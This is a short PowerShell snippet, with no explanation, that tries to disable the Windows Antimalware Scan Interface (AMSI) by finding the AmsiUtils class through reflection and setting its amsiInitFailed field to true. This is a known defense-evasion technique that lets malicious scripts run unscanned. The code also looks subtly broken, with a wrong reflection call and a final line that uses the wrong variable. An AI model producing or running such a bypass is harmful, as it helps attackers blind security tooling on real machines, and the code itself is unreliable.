$a = [ref].assembly.gettypes();

Foreach($b in $a) {
  if ($b.name -like "*iUtils") {
    $c = $b;
  } 
}

$d = $c.getfield("nonpublic, static");
foreach ($e in $d) {
  if ($e.name -like "*amsiinitfailed") {
    $f = $e;
  }
}

$e.setvalue($null,$true);
